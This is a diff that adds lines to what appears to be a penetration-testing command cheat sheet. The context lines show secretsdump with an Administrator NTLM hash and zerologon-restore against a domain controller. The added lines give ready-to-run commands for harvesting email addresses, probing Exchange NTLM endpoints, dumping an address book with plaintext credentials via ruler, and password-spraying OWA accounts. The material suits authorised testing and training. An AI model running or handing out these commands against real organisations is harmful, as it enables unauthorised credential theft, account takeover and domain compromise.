@@ -171,3 +171,9 @@ secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
 zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
 pm3 -p /dev/ttyACM0
 proxmark3 -p /dev/ttyACM0
+theHarvester.py -d example.com -g -s -r -f example.com.xml -b all
+infoga.py -d example.com -s all -b -r example.com.txt -v 2
+nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.example.com
+ruler -k -d example.com -u j.doe -p 'Passw0rd!' -e j.doe@example.com --verbose abk dump -o emails.txt
+ruler -k -d example.com brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
+oaburl.py MEGACORP/j.doe:'Passw0rd!'@mx.example.com -e existent.email@example.com
